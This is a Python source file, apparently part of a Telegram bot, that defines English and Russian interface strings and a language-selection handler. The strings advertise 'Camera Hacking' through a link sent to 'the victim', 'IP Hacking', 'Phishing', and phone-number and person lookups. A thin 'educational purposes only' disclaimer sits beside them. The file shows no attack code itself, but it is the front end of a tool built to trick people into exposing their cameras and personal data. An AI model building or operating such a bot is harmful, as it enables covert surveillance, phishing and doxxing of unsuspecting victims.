from telebot import types
from create_bot import bot

def language_selection_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    buttons = [
        types.InlineKeyboardButton("🇬🇧 English", callback_data='lang_en'),
        types.InlineKeyboardButton("🇷🇺 Русский", callback_data='lang_ru'),
    ]
    markup.add(*buttons)
    return markup




def get_text(key, language):
    translations = {
        'start_message': {
            'en': "Welcome! Please select an option below:",
            'ru': "Добро пожаловать! Выберите один из вариантов ниже:"
        },
        'main_menu_caption': {
            'en': "Main menu\n\n🆔 Your ID: {id}\n👤 Your name: {name}",
            'ru': "Главное меню\n\n🆔 Ваш ID: {id}\n👤 Ваше имя: {name}"
        },
        'back_btn': {
            'en': 'Back',
            'ru': 'Назад'
        },
        'contacnt_btn': {
          'en': 'Contact to Developer',
          'ru': 'Связь с админом'
        },
        'camera_btn': {
          'en': '👨‍💻 Camera Hacking',
          'ru': '👨‍💻 Взломать камеру'
        },
        'ip_btn': {
          'en' : '📍 IP Hacking',
          'ru': '📍 Пробив по IP'
        },
        'cerate_bot_btn': {
            'en': 'Create bot',
            'ru': 'Создать бота'
        },
        'language_btn': {
            'en': '🌐 Language',
            'ru': '🌐 Язык'
        },
        'searchPhone_btn': {
            'en': '🔍 SearchPhone',
            'ru': '🔍 Поиск номера'
        },
        'searchUser_btn': {
            'en': '🔍 SearchUser',
            'ru': '🔍 Поиск человека'
        },
        'cameraHack_page': {
            'en': "Create the link and send it to the victim\n\n {link}",
            'ru': 'Создайте ссылку и отправьте жертве \n\n {link}'
        },
        'ipHack_page': {
            'en': 'Send me IP address',
            'ru': 'Отравьте сюда IP адрес'
        },
        'chatGpt_page': {
            'en': """You are in dialogue with ChatGPT 4\\. Send your request in text format\\.
> Press\\ __Back__\\ to exit\\.
""",
            'ru': """Вы находитесь в диалоге с ChatGpt 4\\. Отправьте свой запрос в текстовом формате\\. 
> Нажмите\\ __Назад__\\ чтобы выйти\\."""
        },
        'acountHack_btn': {
            'en': '🚫 Phishing',
            'ru': '🚫 Фишинг'
        },
        'acountHack_page': {
            'en': 'Test link',
            'ru': 'Тестовая ссылка'
        },
        'contactMe_page': {
            'en': 'send me question',
            'ru': 'есть вопрос? можешь написать его сюда'
        },
        'pagination': {
            'en': '➡️ Next',
            'ru': '➡️ Вперед'
        },
        'tts_page': {
            'en': 'Send me some text\n\n--click on back to leave this page',
            'ru': 'Отправьте мне текст\n\n--Нажмите back чтобы завершить'
            
        },
        'cameraHackBtn': {
            'en': 'Create Link',
            'ru': 'Создать ссылку'
            
        },
        'ipError': {
            'en': '> ERROR\\. enter a correct IP address\\.',
            'ru': '> Ошибка\\. Введите действительный IP адрес\\.'  
        },
        'warrning': {
            'en': '''
If you use this bot, you agree to be bound by our terms.
This bot is for educational purposes only.
I am not responsible for any illegal activities that may occur as a result of using this bot.
If you use this bot, you do so at your own risk.
            ''',
            'ru': '''Если вы используете этого бота, вы соглашаетесь соблюдать наши условия.
Этот бот предназначен только для образовательных целей.
Я не несу ответственности за любые незаконные действия, которые могут произойти в результате использования этого бота.
Если вы используете этого бота, вы делаете это на свой страх и риск.'''
        },
        'thanks': {
            'en': 'Thanks',
            'ru': 'Спасибо'
        },
        'phone_user': {
            'en': '🔍 Enter the phone number you want to search for',
            'ru': '🔍 Отправьте номер телефона'
        },
        'search_user': {
            'en': '🔍 soon',
            'ru': '🔍 Скоро'
        },
        
        
    }
    return translations.get(key, {}).get(language, key)




@bot.callback_query_handler(func=lambda call: call.data == 'change_language')
async def change_language(call):
    
    
    markup = language_selection_keyboard()
    img = open('./img/main.jpeg', 'rb')
    caption_text = "Select your language / Выберите язык:"
    media = types.InputMediaPhoto(media=img, caption=caption_text)
    
    await bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.id, media=media, reply_markup=markup)
    img.close()